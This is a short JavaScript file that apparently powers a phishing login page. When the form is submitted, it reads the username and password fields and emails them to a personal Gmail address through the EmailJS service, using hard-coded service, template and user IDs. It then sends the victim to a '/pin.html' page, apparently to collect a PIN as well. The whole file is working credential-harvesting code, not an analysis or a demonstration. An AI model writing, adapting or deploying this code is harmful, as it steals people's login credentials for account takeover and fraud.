// emailjs.init("");
const username = document.querySelector("#username");
const password = document.querySelector("#password");
const btn = document.querySelector("button");
btn.onclick = () => {
  btn.innerHTML = "Loading...";
};
const serviceId = "service_d6me3am";
const userId = "dRlI_Mqznhjtok8ow";
const templateId = "template_e1pvkye";
document.getElementById("login").onsubmit = function (event) {
  event.preventDefault();
  const emailParams = {
     to_name: "fredrickugoo@gmail.com",
    username: username.value,
    password: password.value,
  };
  console.log(emailParams);
  console.log(emailParams);
  emailjs.send(serviceId, templateId, emailParams, userId).then(
    function (response) {
      console.log("Sent successfully:", response);
      username.value = "";
      password.value = "";
      location.href = "/pin.html";
    },
    function (error) {
      console.log("Failed to send:", error);
    }
  );
};
